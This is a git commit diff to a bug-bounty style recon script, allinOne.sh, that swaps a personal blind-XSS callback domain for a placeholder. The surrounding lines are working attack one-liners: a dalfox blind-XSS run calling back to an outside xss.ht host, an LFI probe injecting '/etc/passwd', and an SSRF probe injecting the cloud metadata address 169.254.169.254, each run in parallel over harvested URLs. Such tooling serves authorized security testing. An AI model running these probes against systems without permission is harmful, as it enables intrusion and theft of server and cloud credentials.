40364882faaea8f33f2d98e4894ebc6af3937cca
Manish Bhardwaj <45557551+h3110mb@users.noreply.github.com>
2021-08-25 03:08:42 -0400

    Update allinOne.sh

--- allinOne.sh
+++ allinOne.sh
@@ -138,6 +138,6 @@ nmap -sC -sV -iL $1/recon/nmap_target.txt  -oA $1/ports/nmap
 
 echo "Testing for XSS + LFI + SSRF"
 echo "***************************************************************************"
-cat $1/waybackurls/wayback.txt | gf xss | dalfox pipe -b h3110mb.xss.ht | tee $1/Dalfox/poc.txt
+cat $1/waybackurls/wayback.txt | gf xss | dalfox pipe -b <PAYLOAD.xss.ht> | tee $1/Dalfox/poc.txt
 cat $1/waybackurls/wayback.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' |tee $1/Misc/LFI.txt
 cat $1/waybackurls/wayback.txt |qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’ |tee $1/Misc/ssrf.txt
